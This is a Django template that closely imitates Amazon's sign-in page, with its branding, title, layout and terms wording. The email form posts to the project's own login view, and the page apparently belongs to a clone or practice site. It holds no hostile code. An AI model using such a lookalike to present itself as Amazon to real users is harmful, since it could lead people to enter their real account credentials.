{% load static %}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign In</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            font-size: 13px;
            line-height: 19px;
            color: #111;
            margin: 0;
            padding: 0;
            background-color: #fff;
        }
        .container {
            width: 100%;
            max-width: 350px;
            margin: 0 auto;
            padding: 20px 0;
        }
        .logo {
            text-align: center;
            margin-bottom: 18px;
        }
        .logo img {
            width: 103px;
            height: auto;
        }
        .auth-container {
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 20px 26px;
        }
        h1 {
            font-weight: 400;
            font-size: 28px;
            line-height: 1.2;
            margin-bottom: 10px;
            margin-top: 0;
        }
        .form-group {
            margin-bottom: 14px;
        }
        label {
            display: block;
            padding-left: 2px;
            padding-bottom: 2px;
            font-weight: 700;
            font-size: 13px;
        }
        input[type="email"],
        input[type="text"],
        input[type="password"] {
            width: 100%;
            height: 31px;
            padding: 3px 7px;
            border: 1px solid #a6a6a6;
            border-radius: 3px;
            box-shadow: 0 1px 0 rgba(255,255,255,.5), 0 1px 0 rgba(0,0,0,.07) inset;
            outline: 0;
            box-sizing: border-box;
        }
        input[type="email"]:focus,
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #e77600;
            box-shadow: 0 0 3px 2px rgba(228,121,17,.5);
        }
        .btn-continue {
            width: 100%;
            height: 31px;
            background: #FFD814;
            border: 1px solid #FCD200;
            border-radius: 8px;
            cursor: pointer;
            box-shadow: 0 2px 5px 0 rgba(213,217,217,.5);
            font-size: 13px;
        }
        .btn-continue:hover {
            background: #F7CA00;
        }
        .terms {
            font-size: 12px;
            margin-top: 18px;
        }
        .terms a {
            text-decoration: none;
            color: #0066c0;
        }
        .terms a:hover {
            text-decoration: underline;
            color: #c45500;
        }
        .help-section {
            margin-top: 20px;
        }
        .help-header {
            color: #0066c0;
            cursor: pointer;
            display: flex;
            align-items: center;
        }
        .help-header:hover {
            text-decoration: underline;
            color: #c45500;
        }
        .help-icon {
            width: 10px;
            height: 10px;
            margin-right: 4px;
        }
        .help-links {
            margin-top: 10px;
        }
        .help-links a {
            display: block;
            text-decoration: none;
            color: #0066c0;
            margin-bottom: 8px;
        }
        .help-links a:hover {
            text-decoration: underline;
            color: #c45500;
        }
        .divider {
            text-align: center;
            position: relative;
            margin: 25px 0;
        }
        .divider:before {
            content: "";
            height: 1px;
            background-color: #e7e7e7;
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
        }
        .divider-text {
            background-color: #fff;
            position: relative;
            display: inline-block;
            padding: 0 8px;
            color: #767676;
            font-size: 12px;
        }
        .business-section {
            margin-top: 20px;
            padding-bottom: 20px;
            border-bottom: 1px solid #e7e7e7;
        }
        .business-section p {
            font-weight: bold;
            margin-bottom: 5px;
        }
        .business-section a {
            text-decoration: none;
            color: #0066c0;
        }
        .business-section a:hover {
            text-decoration: underline;
            color: #c45500;
        }
        .btn-create {
            width: 100%;
            height: 31px;
            background: #fff;
            border: 1px solid #d5d9d9;
            border-radius: 8px;
            cursor: pointer;
            box-shadow: 0 2px 5px 0 rgba(213,217,217,.5);
            font-size: 13px;
        }
        .btn-create:hover {
            background: #f7fafa;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <a href="{% url 'home' %}">
                <img src="{% static 'images/amazon-logo.png' %}" alt="amazon" onerror="this.src='https://via.placeholder.com/103x31?text=amazon'">
            </a>
        </div>
        
        <div class="auth-container">
            <h1>Sign in</h1>
            
            <form action="{% url 'login' %}" method="POST">
                {% csrf_token %}
                
                <div class="form-group">
                    <label for="email">Email or mobile phone number</label>
                    <input type="text" name="email" id="email" required>
                </div>
                
                <div class="form-group">
                    <button type="submit" class="btn-continue">Continue</button>
                </div>
                
                <div class="terms">
                    By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
                </div>
                
                <div class="help-section">
                    <div class="help-header" onclick="toggleHelp()">
                        <span class="help-icon">▼</span> Need help?
                    </div>
                    <div class="help-links" id="helpLinks" style="display: none;">
                        <a href="#">Forgot your password?</a>
                        <a href="#">Other issues with Sign-In</a>
                    </div>
                </div>
                
                <div class="business-section">
                    <p>Buying for work?</p>
                    <a href="#">Shop on Amazon Business</a>
                </div>
            </form>
        </div>
        
        <div class="divider">
            <span class="divider-text">New to Amazon?</span>
        </div>
        
        <a href="{% url 'register' %}" style="text-decoration: none;">
            <button class="btn-create">Create your Amazon account</button>
        </a>
    </div>

    <script>
        function toggleHelp() {
            var helpLinks = document.getElementById('helpLinks');
            var helpIcon = document.querySelector('.help-icon');
            
            if (helpLinks.style.display === 'none') {
                helpLinks.style.display = 'block';
                helpIcon.textContent = '▲';
            } else {
                helpLinks.style.display = 'none';
                helpIcon.textContent = '▼';
            }
        }
    </script>
</body>
</html>
